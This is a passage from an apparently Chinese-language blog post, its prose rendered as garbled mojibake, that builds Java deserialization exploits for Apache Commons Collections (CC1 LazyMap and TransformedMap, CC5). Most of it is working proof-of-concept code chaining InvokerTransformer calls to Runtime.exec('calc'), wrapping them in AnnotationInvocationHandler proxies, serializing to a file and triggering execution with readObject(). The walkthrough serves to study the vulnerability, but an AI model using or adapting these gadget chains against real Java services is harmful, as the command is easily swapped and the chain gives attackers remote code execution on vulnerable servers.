        aConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å–æ¶ˆæ„é€ æ–¹æ³•é™åˆ¶</span>
        <span class="token class-name">Object</span> o <span class="token operator">=</span> aConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> myMap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ä¼ å…¥å‚æ•°å’Œmalicious map</span>

        <span class="token comment">//åºåˆ—åŒ–</span>

        <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"tm.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fileOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/*
        * æœåŠ¡ç«¯ååºåˆ—åŒ–è¯»å–ï¼Œå¹¶è§¦å‘æ¼æ´
        * */</span>
        <span class="token comment">//ååºåˆ—åŒ–</span>
        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"tm.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§¦å‘æ¼æ´</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼Œè¿™æ ·æœåŠ¡ç«¯åªéœ€è¦<code>readObject()</code>å³å¯è§¦å‘ååºåˆ—åŒ–æ¼æ´äº†ï¼</p>
<h3 id="LazyMapç‰ˆæœ¬-POCæ„é€ è¿‡ç¨‹-CommonsCollections-1"><a href="#LazyMapç‰ˆæœ¬-POCæ„é€ è¿‡ç¨‹-CommonsCollections-1" class="headerlink" title="LazyMapç‰ˆæœ¬ - POCæ„é€ è¿‡ç¨‹(CommonsCollections 1)"></a>LazyMapç‰ˆæœ¬ - POCæ„é€ è¿‡ç¨‹(CommonsCollections 1)</h3><h4 id="Intro-1"><a href="#Intro-1" class="headerlink" title="Intro"></a>Intro</h4><p>ç¬¬ä¸€æ­¥åˆ°ç¬¬ä¸‰æ­¥å’Œ<code>TransformedMap</code>ç‰ˆæœ¬éƒ½æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œä¸»è¦é—®é¢˜åœ¨äºå¦‚ä½•callåˆ°<code>ChainedTrasnformer.transform()</code></p>
<p>å‰©ä¸‹çš„æ­¥éª¤å’Œcc3çš„LazyMapã€AnnotationInvocationHandlerã€åŠ¨æ€ä»£ç†ä¸€æ¨¡ä¸€æ ·ï¼Œ<a href="#lazyMap">ç‚¹è¿™é‡Œçœ‹</a></p>
<h4 id="Payloadæ„é€ "><a href="#Payloadæ„é€ " class="headerlink" title="Payloadæ„é€ "></a>Payloadæ„é€ </h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LazyMapExploit</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/*
         * å®¢æˆ·ç«¯æ„é€ payloadï¼Œå¹¶åºåˆ—åŒ–æ–‡ä»¶
         * */</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//è¿”å›Runtime Class</span>
                <span class="token comment">//è·å–getRuntimeæ–¹æ³•</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getDeclaredMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//call getRuntimeæ–¹æ³•å¾—åˆ°Runtimeå®ä¾‹</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//åˆ›å»ºinvokerTransformerï¼Œå¹¶åˆ©ç”¨constructorå¯¹iMethodNameã€iParamTypesã€iArgsè¿›è¡Œèµ‹å€¼</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token comment">//å°†ä¸Šé¢çš„æ•°ç»„ç”¨chainedTransformerä¸²èµ·æ¥ï¼Œæ•°ç»„é‡Œçš„transformerä¼šè¢«æŒ¨ä¸ªæ‰§è¡Œtransform()æ–¹æ³•</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">final</span> <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> classToSerialize <span class="token operator">=</span> <span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> constructor <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>classToSerialize<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">InvocationHandler</span> secondInvocationHandler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Override</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> lazyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">final</span> <span class="token class-name">Map</span> testMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Map</span> evilMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>
                testMap<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                testMap<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                secondInvocationHandler
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> ctor <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>classToSerialize<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        ctor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> ctor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Override</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> evilMap<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//åºåˆ—åŒ–</span>
        <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"lz.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fileOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åºåˆ—åŒ–badAttributeValueExpException</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/*
         * æœåŠ¡ç«¯ååºåˆ—åŒ–è¯»å–ï¼Œå¹¶è§¦å‘æ¼æ´
         * */</span>
        <span class="token comment">//ååºåˆ—åŒ–</span>
        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"lz.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åªéœ€è¦readObject()å°±ä¼šè§¦å‘æ¼æ´</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="LazyMapç‰ˆæœ¬-POCæ„é€ è¿‡ç¨‹ï¼ˆCommonsCollections-5ï¼‰"><a href="#LazyMapç‰ˆæœ¬-POCæ„é€ è¿‡ç¨‹ï¼ˆCommonsCollections-5ï¼‰" class="headerlink" title="LazyMapç‰ˆæœ¬ - POCæ„é€ è¿‡ç¨‹ï¼ˆCommonsCollections 5ï¼‰"></a>LazyMapç‰ˆæœ¬ - POCæ„é€ è¿‡ç¨‹ï¼ˆCommonsCollections 5ï¼‰</h3><h4 id="Intro-2"><a href="#Intro-2" class="headerlink" title="Intro"></a>Intro</h4><hr>
<p><span id="cc5">3/12/2021 è¡¥å……ï¼š</span></p>
<p>ä¹‹å‰å­¦ä¹ çš„æ—¶å€™çœ‹çš„èµ„æ–™å¤ªæ‚ï¼Œå­¦åˆ°cc5çš„æ—¶å€™å‘ç°è¿™ä¸ªLazyMapç‰ˆæœ¬å…¶å®æ˜¯cc5çš„ï¼ŒCC1çš„LazyMapç‰ˆæœ¬å…¶å®æ˜¯ç”¨åˆ°äº†<strong>ä»£ç†</strong>æ–¹é¢çš„çŸ¥è¯†ã€‚</p>
<hr>
<p>æˆ‘ä»¬çš„åˆ©ç”¨é“¾éœ€è¦ç”¨åˆ°å¦‚ä¸‹çš„Class</p>
<ul>
<li>InvokerTransformer</li>
<li>ChainedTrasnformer</li>
<li>ConstantTransformer</li>
<li>LazyMap</li>
<li>BadAttributeValueExpException</li>
</ul>
<h4 id="ç¬¬ä¸€æ­¥åˆ°ç¬¬ä¸‰æ­¥ï¼š"><a href="#ç¬¬ä¸€æ­¥åˆ°ç¬¬ä¸‰æ­¥ï¼š" class="headerlink" title="ç¬¬ä¸€æ­¥åˆ°ç¬¬ä¸‰æ­¥ï¼š"></a>ç¬¬ä¸€æ­¥åˆ°ç¬¬ä¸‰æ­¥ï¼š</h4><p>å’Œä¹‹å‰çš„TransformedMapç‰ˆæœ¬ä½å‰ä¸‰æ­¥æ˜¯ä¸€æ ·çš„ã€‚</p>
<h4 id="ç¬¬å››æ­¥ï¼šLazyMap-get"><a href="#ç¬¬å››æ­¥ï¼šLazyMap-get" class="headerlink" title="ç¬¬å››æ­¥ï¼šLazyMap - get()"></a>ç¬¬å››æ­¥ï¼šLazyMap - get()</h4><p>åŒ<code>TransformedMap</code>ä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦å¯»æ‰¾å¯ä»¥æ‰§è¡Œ<code>chainedTransformer</code>çš„<code>transform()</code>æ–¹æ³•çš„åˆ©ç”¨é“¾ã€‚</p>
<p>åœ¨<code>LazyMap</code>ä¸­ï¼Œæˆ‘ä»¬å‘ç°äº†</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Object</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Object</span> value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>factory<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é‡ç‚¹</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨è¿™æ®µä»£ç ä¸­ï¼Œ<code>this.factory.transform(key)</code>å°±æ‰§è¡Œäº†<code>transform()</code>æ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬èƒ½è®©<code>factory</code>è¢«èµ‹å€¼ä¸ºæˆ‘ä»¬æ„é€ å¥½çš„<code>chainedTransformer</code>ï¼Œå°±å¯ä»¥è§¦å‘æ¼æ´äº†ã€‚</p>
<p>æˆ‘ä»¬å‘ç°LazyMapæœ‰ä¸¤ä¸ªæ„é€ å‡½æ•°ï¼Œå…¶ä¸­ä¸€ä¸ªæ„é€ å‡½æ•°ä¼šä¼ å…¥ä»¥<code>Transformer</code>ç±»å‹çš„å‚æ•°</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">LazyMap</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Transformer</span> factory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>factory <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Factory must not be null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>factory <span class="token operator">=</span> factory<span class="token punctuation">;</span><span class="token comment">//æˆ‘ä»¬å¯ä»¥æ§åˆ¶factory</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘ä»¬å°è¯•æ„é€ POCæ—¶newä¸€ä¸ªæ–°çš„LazyMapï¼Œå¹¶å°†æˆ‘ä»¬çš„é“¾ä¼ è¿›å»ï¼Œå‘ç°æ— æ³•è¢«æ„é€ ã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210805215256433.png" alt="image-20210805215256433" loading="lazy"></p>
<p>è¯¥æ„é€ æ–¹æ³•æ˜¯<strong>protected</strong>ä¿®é¥°çš„ï¼Œæ„å‘³ç€æˆ‘ä»¬ä¸èƒ½ç›´æ¥è®¿é—®ã€‚</p>
<p>åœ¨<code>LazyMap</code>ä¸­ï¼Œè¿˜æœ‰ä¸€ä¸ªæˆ‘ä»¬ç†Ÿæ‚‰çš„<code>decorate()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šè¿”å›æˆ‘ä»¬æƒ³è¦çš„instance</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210805215440540.png" alt="image-20210805215440540" loading="lazy"></p>
<p>äºæ˜¯ï¼Œç°åœ¨çš„<strong>POC</strong>å¯ä»¥æ„é€ å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LazyMapExploit</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/*
         * å®¢æˆ·ç«¯æ„é€ payloadï¼Œå¹¶åºåˆ—åŒ–æ–‡ä»¶
         * */</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//è¿”å›Runtime Class</span>
                <span class="token comment">//è·å–getRuntimeæ–¹æ³•</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getDeclaredMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//call getRuntimeæ–¹æ³•å¾—åˆ°Runtimeå®ä¾‹</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
